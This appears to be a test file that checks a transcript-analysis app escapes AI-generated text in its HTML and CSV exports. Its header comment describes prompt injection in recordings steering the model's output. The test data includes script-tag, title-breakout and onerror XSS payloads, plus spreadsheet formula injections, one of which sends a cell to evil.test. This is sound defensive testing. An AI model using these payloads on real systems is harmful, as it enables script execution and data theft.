// End-to-end tests for the generated export files.
//
// These exercise the real generators (not just the escaping helpers) so a
// regression that drops an escapeHtml/csvCell call at a call site is caught.
// Before the fix, generateHTMLExport interpolated the project name and the
// whole markdown body into a text/html Blob without escaping; the file is
// written to disk and opened outside the app, where the app's CSP does not
// apply, so a model response containing markup executed when the user opened
// the export.
//
// The payloads here model prompt injection: analysis text is generated by the
// AI provider from transcript content, so a recording can steer it into
// emitting markup or a spreadsheet formula.

import { describe, it, expect } from 'vitest';
import {
  generateHTMLExport,
  generateCSVExport,
  generateMarkdownExport,
  type ProjectExportData,
} from '../src/utils/export-generators';

const HOSTILE_SCRIPT = '<script>alert(document.domain)</script>';
const HOSTILE_BREAKOUT = '</title><script>alert(1)</script>';

function baseData(overrides: Partial<ProjectExportData> = {}): ProjectExportData {
  return {
    exported_at: '2026-10-10T00:00:00.000Z',
    project: {
      name: 'Team Retrospective',
      created_at: '2026-01-01T00:00:00.000Z',
      description: 'Quarterly review',
      transcript_count: 4,
      total_duration: 5400,
    },
    analysis: {
      summary: 'The team agreed on scope.',
      themes: ['Velocity', 'Ownership'],
      key_insights: ['Follow-ups were assigned.'],
    },
    ...overrides,
  };
}

const meta = {
  exportFormat: 'pdf',
  exportSections: { overview: true, themes: true, transcripts: false },
};

describe('generateHTMLExport', () => {
  it('renders a script payload from an AI summary inertly', () => {
    const data = baseData({
      analysis: { ...baseData().analysis, summary: HOSTILE_SCRIPT },
    });
    const html = generateHTMLExport(data, meta);

    expect(html).not.toContain('<script>');
    expect(html).toContain('&lt;script&gt;');
  });

  it('renders a script payload in a theme inertly', () => {
    const data = baseData({
      analysis: { ...baseData().analysis, themes: [HOSTILE_SCRIPT, 'Velocity'] },
    });
    const html = generateHTMLExport(data, meta);
    expect(html).not.toContain('<script>');
    expect(html).toContain('&lt;script&gt;');
  });

  it('renders a script payload in a key insight inertly', () => {
    const data = baseData({
      analysis: { ...baseData().analysis, key_insights: [HOSTILE_SCRIPT] },
    });
    expect(generateHTMLExport(data, meta)).not.toContain('<script>');
  });

  it('cannot break out of <title> via the project name', () => {
    const data = baseData();
    data.project.name = HOSTILE_BREAKOUT;
    const html = generateHTMLExport(data, meta);

    // Exactly one real <title> tag, and it is closed.
    const titles = html.match(/<title>/g) || [];
    expect(titles).toHaveLength(1);
    expect(html).not.toContain('</title><script>');
    expect(html).not.toContain('<script>');
  });

  it('neutralises an attribute-injection payload in a speaker name', () => {
    const data = baseData({
      analysis: {
        ...baseData().analysis,
        speakerAnalysis: {
          totalSpeakers: 1,
          speakerDistribution: {
            '"><img src=x onerror=alert(1)>': {
              transcriptCount: 1,
              totalSegments: 4,
              themes: [],
            },
          },
        },
      },
    });
    const html = generateHTMLExport(data, meta);
    // The payload may survive as visible TEXT, but never as markup: the
    // quote and angle brackets are escaped, so no tag or attribute is formed.
    expect(html).not.toContain('<img');
    expect(html).toContain('&quot;&gt;&lt;img src=x onerror=alert(1)&gt;');
  });

  it('neutralises a payload in a cross-transcript pattern description', () => {
    const data = baseData({
      analysis: {
        ...baseData().analysis,
        crossTranscriptPatterns: [
          {
            description: HOSTILE_SCRIPT,
            type: 'recurring_theme',
            strength: 0.8,
            evidence: [{}],
            insights: [HOSTILE_SCRIPT],
          },
        ],
      },
    });
    expect(generateHTMLExport(data, meta)).not.toContain('<script>');
  });

  it('leaves NO attacker-controlled markup anywhere in the document', () => {
    // Belt-and-braces: enumerate every tag in the output and allow only the
    // fixed set the template itself emits.
    const data = baseData({
      project: { ...baseData().project, name: HOSTILE_SCRIPT },
      analysis: {
        summary: HOSTILE_SCRIPT,
        themes: [HOSTILE_SCRIPT],
        key_insights: [HOSTILE_SCRIPT],
      },
    });
    const html = generateHTMLExport(data, meta);
    const tags = Array.from(html.matchAll(/<\/?([a-zA-Z][a-zA-Z0-9]*)/g)).map((m) =>
      m[1].toLowerCase()
    );
    const allowed = new Set([
      'html', 'head', 'meta', 'title', 'style', 'body',
      'div', 'strong', 'br', 'h1', 'h2', 'h3', 'li',
    ]);
    expect(tags.filter((t) => !allowed.has(t))).toEqual([]);
  });

  it('still renders its own structural markup', () => {
    // The fix escapes BEFORE the markdown rewrite; if the order ever flips, the
    // generated tags would be escaped and the document would lose its headings.
    const html = generateHTMLExport(baseData(), meta);
    expect(html).toContain('<h1>');
    expect(html).toContain('<h2>');
    expect(html).toContain('<li>');
    expect(html).toContain('<strong>');
  });

  it('does not double-escape the entities it introduces', () => {
    const data = baseData({
      analysis: { ...baseData().analysis, summary: 'Scope & velocity <ok>' },
    });
    const html = generateHTMLExport(data, meta);
    expect(html).toContain('Scope &amp; velocity &lt;ok&gt;');
    expect(html).not.toContain('&amp;amp;');
  });
});

describe('generateCSVExport', () => {
  it('neutralises formula injection in a theme name', () => {
    const data = baseData({
      analysis: {
        ...baseData().analysis,
        themes: ['=HYPERLINK("http://evil.test/?d="&A1,"click")'],
      },
    });
    const csv = generateCSVExport(data);
    expect(csv).not.toMatch(/^"?=/m);
    expect(csv).toContain(`"'=HYPERLINK`);
  });

  it('neutralises formula injection in the project name', () => {
    const data = baseData();
    data.project.name = '+cmd|calc';
    expect(generateCSVExport(data)).toContain(`"'+cmd|calc"`);
  });

  it('cannot break out of a quoted field with an embedded quote', () => {
    const data = baseData({
      analysis: { ...baseData().analysis, themes: ['say "hi", now'] },
    });
    const csv = generateCSVExport(data);
    // The payload must appear escaped, never as a bare quote-delimited break.
    expect(csv).toContain('"say ""hi"", now"');
  });

  it('neutralises formula injection in a concept key', () => {
    const data = baseData({
      analysis: {
        ...baseData().analysis,
        conceptFrequency: {
          '=cmd': { totalCount: 1, transcriptCount: 1, avgFrequency: 1, trend: 'rising' },
        },
      },
    });
    expect(generateCSVExport(data)).toContain(`"'=cmd"`);
  });
});

describe('generateMarkdownExport', () => {
  it('passes AI text through verbatim (markdown is a text format)', () => {
    // Deliberately NOT escaped: a .md file is plain text, and escaping here
    // would corrupt the user's content when they paste it elsewhere. This test
    // documents that choice so a future change is deliberate.
    const data = baseData({
      analysis: { ...baseData().analysis, summary: 'a < b and b > c' },
    });
    expect(generateMarkdownExport(data)).toContain('a < b and b > c');
  });
});